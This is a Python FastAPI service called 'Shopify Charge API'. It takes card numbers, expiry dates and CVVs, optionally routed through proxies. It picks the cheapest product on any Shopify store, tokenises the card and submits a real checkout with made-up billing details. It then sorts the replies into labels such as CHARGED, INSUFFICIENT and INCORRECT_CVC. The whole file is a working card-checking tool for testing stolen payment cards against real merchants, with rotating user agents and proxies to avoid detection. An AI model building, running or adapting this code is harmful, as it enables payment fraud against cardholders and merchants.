from fastapi import FastAPI
from pydantic import BaseModel
from typing import Optional
import re
import json
import random
import asyncio
import aiohttp
from urllib.parse import urlparse

app = FastAPI(title="Shopify Charge API", version="4.0.0")

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36',
]

PROPOSAL_QUERY = '''
query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput){
  session(sessionInput:$sessionInput){
    negotiate(input:{
      purchaseProposal:{
        delivery:$delivery
        payment:$payment
        merchandise:$merchandise
        buyerIdentity:$buyerIdentity
        taxes:$taxes
      }
      queueToken:$queueToken
    }){
      result{
        ...on NegotiationResultAvailable{
          checkpointData
          queueToken
          buyerProposal{
            delivery{__typename}
            payment{__typename}
          }
          sellerProposal{
            delivery{
              ...on FilledDeliveryTerms{
                deliveryLines{
                  availableDeliveryStrategies{
                    handle
                    amount{value{amount currencyCode}}
                  }
                }
              }
            }
            payment{
              ...on FilledPaymentTerms{
                availablePaymentLines{
                  paymentMethod{
                    ...on PaymentProvider{
                      paymentMethodIdentifier
                      name
                    }
                  }
                }
              }
            }
            merchandise{
              ...on FilledMerchandiseTerms{
                merchandiseLines{
                  stableId
                  totalAmount{value{amount currencyCode}}
                }
              }
            }
            runningTotal{value{amount currencyCode}}
            tax{
              ...on FilledTaxTerms{
                totalTaxAmount{value{amount currencyCode}}
              }
            }
          }
        }
        ...on CheckpointDenied{redirectUrl}
        ...on Throttled{pollAfter queueToken}
        ...on SubmittedForCompletion{receipt{id}}
      }
      errors{code localizedMessage}
    }
  }
}
'''

SUBMIT_QUERY = '''
mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){
  submitForCompletion(input:$input attemptToken:$attemptToken){
    ...on SubmitSuccess{receipt{id}}
    ...on SubmitRejected{
      errors{...on NegotiationError{code localizedMessage}}
    }
    ...on Throttled{pollAfter pollUrl queueToken}
    ...on CheckpointDenied{redirectUrl}
  }
}
'''

POLL_QUERY = '''
query PollForReceipt($receiptId:ID!,$sessionToken:String!){
  receipt(receiptId:$receiptId sessionInput:{sessionToken:$sessionToken}){
    ...on ProcessedReceipt{id}
    ...on WaitingReceipt{id}
    ...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url}}}
    ...on FailedReceipt{id processingError{code messageUntranslated}}
  }
}
'''

class CheckRequest(BaseModel):
    site: str
    cc: str
    mm: str
    yy: str
    cvv: str
    proxy: Optional[str] = None

class SiteRequest(BaseModel):
    site: str

def normalize_site(site: str) -> str:
    site = site.strip().lower()
    if not site.startswith("http"):
        site = "https://" + site
    return site.rstrip("/")

def classify(text: str) -> str:
    t = (text or "").lower()
    if "payment_method_identifier" in t and "id" in t:
        return "CHARGED"
    if "insufficient" in t:
        return "INSUFFICIENT"
    if "incorrect_cvc" in t or "invalid_cvc" in t:
        return "INCORRECT_CVC"
    if "3d" in t or "actionrequired" in t or "completepaymentchallenge" in t:
        return "3D_SECURE"
    if "do_not_honor" in t or "do not honor" in t:
        return "DO_NOT_HONOR"
    if "expired" in t:
        return "EXPIRED_CARD"
    if "invalid" in t:
        return "INVALID_CARD"
    if "processedreceipt" in t:
        return "CHARGED"
    if "waitingreceipt" in t:
        return "PENDING"
    if "failedreceipt" in t:
        return "DECLINED"
    if "declined" in t:
        return "DECLINED"
    if "approved" in t or "success" in t:
        return "APPROVED"
    return "ERROR"

async def fetch_products(site: str, proxy: Optional[str] = None):
    site = normalize_site(site)
    proxy_url = None
    if proxy:
        p = proxy.split(":")
        if len(p) == 4:
            proxy_url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
        else:
            proxy_url = f"http://{proxy}"

    try:
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            if proxy_url:
                async with s.get(f"{site}/products.json", proxy=proxy_url) as r:
                    if r.status != 200:
                        return None, "Site Error"
                    data = await r.json()
            else:
                async with s.get(f"{site}/products.json") as r:
                    if r.status != 200:
                        return None, "Site Error"
                    data = await r.json()

        products = data.get("products", [])
        if not products:
            return None, "No Products"

        best = None
        min_price = float('inf')
        for product in products:
            for variant in product.get("variants", []):
                try:
                    price = float(variant.get("price", "0"))
                except:
                    continue
                if price < min_price:
                    min_price = price
                    best = {
                        "site": site,
                        "price": f"{price:.2f}",
                        "variant_id": str(variant["id"]),
                        "link": f"{site}/products/{product.get('handle', '')}"
                    }

        if not best:
            return None, "No Valid Products"
        return best, best["price"]
    except Exception as e:
        return None, str(e)[:60]

async def get_payment_token(card: str, scope: str, proxy: Optional[str] = None):
    parts = card.split("|")
    if len(parts) != 4:
        return None, "Invalid Card"

    cc, mm, yy, cvv = parts
    if len(yy) == 2:
        yy = "20" + yy

    formatted = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])

    payload = {
        "credit_card": {
            "month": mm,
            "year": yy,
            "number": formatted,
            "verification_value": cvv,
            "name": "Test User"
        },
        "payment_session_scope": scope
    }

    proxy_url = None
    if proxy:
        p = proxy.split(":")
        if len(p) == 4:
            proxy_url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
        else:
            proxy_url = f"http://{proxy}"

    headers = {"Content-Type": "application/json"}
    timeout = aiohttp.ClientTimeout(total=30)

    try:
        async with aiohttp.ClientSession(timeout=timeout) as s:
            if proxy_url:
                async with s.post("https://deposit.shopifycs.com/sessions", json=payload, headers=headers, proxy=proxy_url) as r:
                    data = await r.json()
            else:
                async with s.post("https://deposit.shopifycs.com/sessions", json=payload, headers=headers) as r:
                    data = await r.json()

        tid = data.get("id")
        if not tid:
            return None, "Token Failed"
        return tid, None
    except Exception as e:
        return None, str(e)[:50]

async def get_checkout_session(site_info: dict, proxy: Optional[str] = None):
    checkout_url = f"{site_info['site']}/cart/{site_info['variant_id']}:1"

    proxy_url = None
    if proxy:
        p = proxy.split(":")
        if len(p) == 4:
            proxy_url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
        else:
            proxy_url = f"http://{proxy}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml",
    }

    try:
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            if proxy_url:
                async with s.get(checkout_url, headers=headers, proxy=proxy_url) as r:
                    html = await r.text()
                    final_url = str(r.url)
            else:
                async with s.get(checkout_url, headers=headers) as r:
                    html = await r.text()
                    final_url = str(r.url)

            if "checkout" not in final_url:
                return None, "Checkout Failed"

            sst = re.search(r'serialized-session-token["\s:]+([^"&]+)', html)
            queue = re.search(r'queueToken["\s:]+([^"&]+)', html)

            if not sst:
                return None, "Session Token Not Found"

            return {
                "sst": sst.group(1),
                "queue_token": queue.group(1) if queue else None,
                "checkout_url": final_url,
                "attempt_token": final_url.split('/')[-1]
            }, None

    except Exception as e:
        return None, str(e)[:50]

async def run_charge(site_info: dict, session: dict, token: str, card: str, proxy: Optional[str] = None):
    parts = card.split("|")
    cc, mm, yy, cvv = parts

    proxy_url = None
    if proxy:
        p = proxy.split(":")
        if len(p) == 4:
            proxy_url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
        else:
            proxy_url = f"http://{proxy}"

    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
    }

    domain = urlparse(session["checkout_url"]).netloc

    try:
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            proposal_vars = {
                "sessionInput": {"sessionToken": session["sst"]},
                "queueToken": session["queue_token"],
                "merchandise": {
                    "merchandiseLines": [{
                        "merchandise": {
                            "productVariantReference": {
                                "variantId": f"gid://shopify/ProductVariant/{site_info['variant_id']}"
                            }
                        },
                        "quantity": {"items": {"value": 1}}
                    }]
                },
                "payment": {"paymentLines": []}
            }

            if proxy_url:
                r1 = await s.post(f"https://{domain}/checkouts/unstable/graphql?operationName=Proposal", json={"query": PROPOSAL_QUERY, "variables": proposal_vars}, headers=headers, proxy=proxy_url)
            else:
                r1 = await s.post(f"https://{domain}/checkouts/unstable/graphql?operationName=Proposal", json={"query": PROPOSAL_QUERY, "variables": proposal_vars}, headers=headers)

            proposal_text = await r1.text()
            proposal_data = json.loads(proposal_text)

            neg = proposal_data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
            seller = neg.get("sellerProposal", {})

            payment_lines = seller.get("payment", {}).get("availablePaymentLines", [])
            if payment_lines:
                pmi = payment_lines[0].get("paymentMethod", {}).get("paymentMethodIdentifier")
            else:
                pmi = "card"

            submit_vars = {
                "input": {
                    "sessionInput": {"sessionToken": session["sst"]},
                    "queueToken": neg.get("queueToken") or session["queue_token"],
                    "payment": {
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": pmi,
                                    "sessionId": token,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": "123 Main St",
                                            "city": "New York",
                                            "countryCode": "US",
                                            "postalCode": "10001",
                                            "firstName": "Test",
                                            "lastName": "User",
                                            "zoneCode": "NY",
                                            "phone": "+12132372372"
                                        }
                                    }
                                }
                            }
                        }]
                    },
                    "merchandise": proposal_vars["merchandise"],
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
                        "email": "testuser@gmail.com"
                    }
                },
                "attemptToken": session["attempt_token"]
            }

            if proxy_url:
                r2 = await s.post(f"https://{domain}/checkouts/unstable/graphql?operationName=SubmitForCompletion", json={"query": SUBMIT_QUERY, "variables": submit_vars}, headers=headers, proxy=proxy_url)
            else:
                r2 = await s.post(f"https://{domain}/checkouts/unstable/graphql?operationName=SubmitForCompletion", json={"query": SUBMIT_QUERY, "variables": submit_vars}, headers=headers)

            submit_text = await r2.text()

            if "receipt" in submit_text:
                rid_match = re.search(r'"id":"(gid://shopify/Receipt/[^"]+)"', submit_text)
                if rid_match:
                    rid = rid_match.group(1)
                    poll_vars = {"receiptId": rid, "sessionToken": session["sst"]}
                    for _ in range(3):
                        await asyncio.sleep(4)
                        if proxy_url:
                            r3 = await s.post(f"https://{domain}/checkouts/unstable/graphql?operationName=PollForReceipt", json={"query": POLL_QUERY, "variables": poll_vars}, headers=headers, proxy=proxy_url)
                        else:
                            r3 = await s.post(f"https://{domain}/checkouts/unstable/graphql?operationName=PollForReceipt", json={"query": POLL_QUERY, "variables": poll_vars}, headers=headers)
                        poll_text = await r3.text()
                        if "ProcessedReceipt" in poll_text:
                            return "CHARGED", "Charged Successfully"
                        if "WaitingReceipt" not in poll_text:
                            break

            return classify(submit_text), submit_text[:100]

    except Exception as e:
        return "ERROR", str(e)[:80]

@app.get("/")
async def root():
    return {"status": "ok", "service": "Shopify Charge API"}

@app.get("/health")
async def health():
    return {"status": "alive"}

@app.post("/site")
async def check_site(req: SiteRequest):
    site = normalize_site(req.site)
    info, price = await fetch_products(site)
    if info:
        return {"site": site, "status": "alive", "price": price}
    return {"site": site, "status": "dead", "error": price}

@app.post("/check")
async def check_card(req: CheckRequest):
    site = normalize_site(req.site)
    card = f"{req.cc}|{req.mm}|{req.yy}|{req.cvv}"

    info, price = await fetch_products(site, req.proxy)
    if not info:
        return {"status": "ERROR", "message": price, "site": site}

    session, err = await get_checkout_session(info, req.proxy)
    if not session:
        return {"status": "ERROR", "message": err, "site": site, "price": price}

    scope = urlparse(session["checkout_url"]).netloc

    token, err2 = await get_payment_token(card, scope, req.proxy)
    if not token:
        return {"status": "ERROR", "message": err2, "site": site, "price": price}

    status, msg = await run_charge(info, session, token, card, req.proxy)

    return {
        "status": status,
        "message": msg,
        "site": site,
        "price": price,
        "token_id": token,
        "link": info["link"]
    }